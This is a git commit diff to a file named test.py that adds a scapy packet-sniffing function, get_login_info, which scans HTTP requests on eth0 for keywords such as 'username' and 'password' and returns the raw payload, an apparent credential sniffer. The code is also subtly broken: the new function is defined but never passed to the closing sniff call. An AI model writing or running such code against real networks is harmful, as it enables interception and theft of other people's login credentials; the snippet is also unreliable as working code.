5d3bea6a833a4d56f5255c25395f8824fb8c33f9
gtii <87583182+gtii@users.noreply.github.com>
2023-01-25 23:29:02 +0530

    Update test.py

--- test.py
+++ test.py
@@ -5,3 +5,14 @@ def packet_callback(packet):
 
 # sniff packets on the eth0 interface
 sniff(iface="eth0", prn=packet_callback, store=0)
+
+def get_login_info(packet):
+    if packet.haslayer(http.HTTPRequest):
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load
+            keybword = ["usr", "uname", "username", "pwd", "pass", "password"]
+            for eachword in keybword:
+                if eachword.encode() in load:
+                    return load
+                
+sniff('eth0')                
